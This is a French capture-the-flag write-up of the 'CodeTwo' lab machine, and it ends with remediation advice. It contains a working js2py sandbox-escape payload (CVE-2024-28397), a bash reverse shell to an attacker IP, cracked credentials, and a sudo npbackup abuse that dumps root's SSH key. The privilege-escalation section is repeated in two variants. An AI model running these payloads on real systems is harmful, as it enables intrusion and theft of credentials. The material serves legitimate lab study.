![Cover](cover.png)

# Phase 1 : Reconnaissance & Brèche Initiale

## Énumération des Services

La phase de reconnaissance commence par un **TCP Port Scan** agressif pour identifier la surface d'attaque.

```bash
# Scan rapide de tous les ports
nmap -p- -vvv --min-rate 10000 10.10.11.82

# Scan de services détaillé sur les ports identifiés
nmap -p 22,8000 -sCV 10.10.11.82
```

Les résultats révèlent deux services actifs :
*   **Port 22 (SSH)** : OpenSSH 8.2p1 (Ubuntu).
*   **Port 8000 (HTTP)** : Serveur **Gunicorn** 20.0.4, hébergeant une application **Flask**.

## Analyse de l'Application Web

Le service sur le port 8000 est une plateforme nommée "CodeTwo", présentée comme un **Developer Sandbox** permettant d'exécuter du code **JavaScript**. 

Points clés identifiés lors de l'exploration :
1.  **Source Code Disclosure** : Un lien "Download App" permet de récupérer `app.zip`, contenant l'intégralité du code source Python (`app.py`) et une base de données **SQLite** (`users.db`).
2.  **Authentication** : L'application permet l'enregistrement d'utilisateurs. Les sessions sont gérées via des **Flask Cookies** signés.
3.  **Execution Engine** : Le code JavaScript soumis via le endpoint `/run_code` est traité par la bibliothèque Python **js2py**.

### Analyse du Code Source (`app.py`)

L'analyse statique du fichier `app.py` montre l'utilisation de `js2py.eval_js(code)` pour interpréter les entrées utilisateur. Bien que le développeur ait tenté de sécuriser l'environnement avec `js2py.disable_pyimport()`, cette mesure est insuffisante face à des techniques d'évasion avancées.

Le fichier `requirements.txt` confirme la version vulnérable :
```text
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

## Identification de la Vulnérabilité : CVE-2024-28397

La bibliothèque **js2py** (version <= 0.74) est sujette à une **Sandbox Escape** majeure référencée sous la **CVE-2024-28397**. Puisque **js2py** traduit le JavaScript en objets Python avant exécution, un attaquant peut remonter l'arborescence des objets Python pour accéder aux classes de base et importer des modules dangereux comme `os` ou `subprocess`.

> **Schéma Mental : Sandbox Escape via Prototype Pollution / Object Discovery**
> 1. En JavaScript, on accède à un objet Python via un dictionnaire vide `{}`.
> 2. On utilise `__getattribute__` pour récupérer la classe de l'objet (`__class__`).
> 3. On remonte à la classe parente `object` via `__base__`.
> 4. On énumère toutes les classes chargées en mémoire avec `__subclasses__()`.
> 5. On localise la classe `subprocess.Popen` pour exécuter des commandes système sur l'hôte Linux.

## Exploitation et Premier Shell

Pour vérifier l'exécution de code, j'utilise un payload JS conçu pour déclencher un **ICMP Echo Request** (ping) vers ma machine d'attaque.

```javascript
// Payload de test (RCE aveugle)
let hacked = Object.getOwnPropertyNames({});
let bymarve = hacked.__getattribute__;
let n11 = bymarve("__getattribute__");
let obj = n11("__class__").__base__;

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i];
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item;
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result;
        }
    }
}

// Exécution de la commande
let cmd = "ping -c 1 10.10.14.6";
let res = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
res;
```

Après confirmation de la réception du paquet via `tcpdump`, je modifie la variable `cmd` pour obtenir un **Reverse Shell**.

### Payload Final (Reverse Shell) :
```javascript
let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'";
```

### Capture du Shell :
Sur ma machine, j'écoute sur le port 443 :
```bash
nc -lnvp 443
```

Une fois la connexion établie, je stabilise le shell pour obtenir un terminal interactif :
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

Je suis maintenant connecté en tant qu'utilisateur **app** sur la machine **codetwo**.

---

### Énumération Post-Exploitation & Pivot vers Marco

Une fois mon accès initial établi en tant qu'utilisateur **app**, je commence par inspecter l'environnement local. Le répertoire personnel contient les sources de l'application Flask et une base de données **SQLite**.

```bash
# Inspection du répertoire de l'application
ls -la /home/app/app/instance/
sqlite3 /home/app/app/instance/users.db
```

Dans la table `user`, je récupère deux entrées contenant des identifiants et des **MD5 password hashes** :
*   **marco** : `649c9d65a206a75f5abe509fe128bce5`
*   **app** : `a97588c0e2fa3a024876339e27aeb42e`

> Schéma Mental : Extraction de Credentials
> 1. Accès Shell (app) -> 2. Lecture de la base SQLite locale -> 3. Extraction des hashes MD5 -> 4. Offline Cracking (CrackStation/Hashcat) -> 5. Pivot horizontal via SSH/su.

Le hash de **marco** est rapidement cassé via **CrackStation**, révélant le mot de passe : `sweetangelbabylove`. Je l'utilise pour migrer vers une session plus stable via **SSH**.

```bash
ssh marco@10.10.11.82
# Password: sweetangelbabylove
```

### Escalade de Privilèges : Abus de NPBackup-cli

En tant que **marco**, j'effectue une énumération des droits **Sudo**. Je remarque immédiatement une configuration permissive pour un utilitaire de sauvegarde.

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

**NPBackup** est un wrapper Python autour de l'outil **restic**. L'analyse de l'aide (`-h`) et du fichier de configuration par défaut `~/npbackup.conf` montre que l'outil utilise des fichiers YAML pour définir les sources de sauvegarde et les destinations (**repositories**).

> Schéma Mental : Arbitrary File Read via Backup
> 1. Binaire Sudo (npbackup-cli) -> 2. Contrôle du fichier de configuration (-c) -> 3. Création d'un profil de sauvegarde pointant vers /root -> 4. Exécution de la sauvegarde en tant que root -> 5. Restauration ou lecture des données sauvegardées.

Le fichier `npbackup.conf` original contient des **encrypted strings** pour le mot de passe du repository et l'URI. Je vais détourner cette logique en créant ma propre configuration pour exfiltrer la clé SSH de **root**.

#### 1. Préparation de la configuration malveillante
Je crée un fichier `exploit.conf` dans `/dev/shm`. Je modifie la section `paths` pour inclure `/root/.ssh/id_rsa` et je pointe le `repo_uri` vers un dossier local où j'ai les droits d'écriture.

```yaml
# /dev/shm/exploit.conf (extrait modifié)
repos:
  default:
    repo_uri: /dev/shm/repo
    backup_opts:
      paths:
      - /root/.ssh/id_rsa
      source_type: folder_list
    repo_opts:
      repo_password: password123
```

#### 2. Initialisation et exécution du backup
Puisque je peux exécuter le binaire avec les privilèges **root**, je force la sauvegarde de la clé privée.

```bash
# Initialisation d'un nouveau repository restic local
mkdir /dev/shm/repo
sudo npbackup-cli -c /dev/shm/exploit.conf --init

# Exécution de la sauvegarde (lecture de /root/ en tant que root)
sudo npbackup-cli -c /dev/shm/exploit.conf -b
```

#### 3. Extraction de la clé SSH
Une fois la sauvegarde terminée, j'utilise l'option `--ls` ou `--dump` pour récupérer le contenu du fichier sensible directement depuis le repository créé.

```bash
# Lister les fichiers dans le dernier snapshot
sudo npbackup-cli -c /dev/shm/exploit.conf --ls

# Dump de la clé privée SSH de root
sudo npbackup-cli -c /dev/shm/exploit.conf --dump /root/.ssh/id_rsa > /dev/shm/id_rsa
chmod 600 /dev/shm/id_rsa
```

Il ne me reste plus qu'à utiliser cette clé pour me connecter en tant que **root** via l'interface **loopback** ou directement depuis ma machine d'attaque.

```bash
ssh -i /dev/shm/id_rsa root@127.0.0.1
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois positionné en tant que **marco**, l'énumération du système révèle un vecteur d'élévation de privilèges lié à une configuration **Sudo** permissive et à l'utilisation d'un logiciel de sauvegarde tiers : **NPBackup**.

#### 1. Analyse du vecteur Sudo & NPBackup

L'exécution de `sudo -l` indique que l'utilisateur **marco** peut exécuter `/usr/local/bin/npbackup-cli` avec les privilèges de n'importe quel utilisateur, sans mot de passe.

```bash
marco@codetwo:~$ sudo -l
(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

**NPBackup** est une surcouche (wrapper) Python construite sur **restic**. Il utilise des fichiers de configuration **YAML** pour définir les **repositories**, les mots de passe et les chemins à sauvegarder. Le fichier de configuration par défaut `npbackup.conf` contient des sections chiffrées/obfusquées (`__NPBACKUP__...`), mais nous n'avons pas besoin de les déchiffrer pour exploiter l'outil.

> **Schéma Mental : Abus de binaire de sauvegarde**
> 1. **Privilège** : Le binaire tourne en tant que **root** via **sudo**.
> 2. **Contrôle** : L'argument `-c` permet de spécifier un fichier de configuration arbitraire.
> 3. **Action** : En créant une configuration pointant vers `/root/`, on force le binaire (sous l'identité **root**) à lire et indexer des fichiers protégés dans un **repository** que nous contrôlons ou dont nous connaissons la structure.
> 4. **Extraction** : Utiliser la fonction `--dump` ou `--restore` pour récupérer les données sensibles.

#### 2. Création d'une configuration malveillante

Je duplique la configuration existante dans `/dev/shm` pour la modifier. L'objectif est de changer le paramètre `paths` pour inclure le répertoire personnel de **root**.

```bash
# Copie de la configuration légitime
cp /home/marco/npbackup.conf /dev/shm/exploit.conf

# Modification du chemin de sauvegarde vers /root/
sed -i 's|- /home/app/app/|- /root/|' /dev/shm/exploit.conf
```

#### 3. Exécution de la sauvegarde et extraction des secrets

Je lance la sauvegarde en utilisant la configuration modifiée. Puisque je lance la commande avec `sudo`, **npbackup-cli** a un accès complet en lecture sur `/root/`.

```bash
# Lancement de la sauvegarde (Backup)
sudo /usr/local/bin/npbackup-cli -c /dev/shm/exploit.conf -b

# Listing des fichiers présents dans le dernier snapshot
sudo /usr/local/bin/npbackup-cli -c /dev/shm/exploit.conf --ls
```

Une fois le contenu listé, je peux extraire n'importe quel fichier, notamment le flag **root.txt** ou la clé privée SSH de l'administrateur pour obtenir un shell persistant.

```bash
# Lecture du flag root via la fonction dump
sudo /usr/local/bin/npbackup-cli -c /dev/shm/exploit.conf --dump /root/root.txt

# Extraction de la clé SSH pour persistance
sudo /usr/local/bin/npbackup-cli -c /dev/shm/exploit.conf --dump /root/.ssh/id_rsa > /dev/shm/root_key
chmod 600 /dev/shm/root_key
ssh -i /dev/shm/root_key root@127.0.0.1
```

---

### Beyond Root : Analyse Post-Exploitation

La compromission totale de **CodeTwo** met en lumière plusieurs faiblesses architecturales critiques :

1.  **Sandbox Escape (CVE-2024-28397)** : L'utilisation de **js2py** pour exécuter du code utilisateur est intrinsèquement risquée. Cette bibliothèque ne fournit pas une isolation de niveau noyau ou conteneur. L'accès aux attributs Python via l'objet JavaScript permet de remonter la chaîne des classes jusqu'à `subprocess.Popen`.
    *   *Remédiation* : Utiliser des moteurs JavaScript isolés comme **Isolate** (v8) ou exécuter le code dans des conteneurs **Docker** éphémères avec des ressources limitées.

2.  **Gestion des secrets en base de données** : Le stockage de hashs **MD5** pour les mots de passe est une pratique obsolète. **MD5** est vulnérable aux attaques par **Rainbow Tables** et aux collisions.
    *   *Remédiation* : Utiliser des algorithmes de hachage modernes avec sel (Salt) et facteur de coût comme **Argon2** ou **bcrypt**.

3.  **Principe du moindre privilège (Sudo)** : Accorder un accès **Sudo** sur un binaire de sauvegarde qui accepte un fichier de configuration arbitraire revient à donner un accès **root** direct. **NPBackup**, en permettant de définir les chemins sources via la configuration utilisateur, devient un vecteur de **Arbitrary File Read**.
    *   *Remédiation* : Restreindre l'utilisation de `sudo` à des scripts wrappers dont les arguments et les chemins de configuration sont statiques et non modifiables par l'utilisateur.

4.  **Obfuscation vs Chiffrement** : Le format `__NPBACKUP__...` dans les fichiers de configuration n'est qu'une forme d'obfuscation (probablement Base64 + un XOR simple ou un chiffrement symétrique avec clé statique). En environnement de production, les secrets de connexion aux **repositories** devraient être gérés via un **Secret Manager** ou des variables d'environnement sécurisées.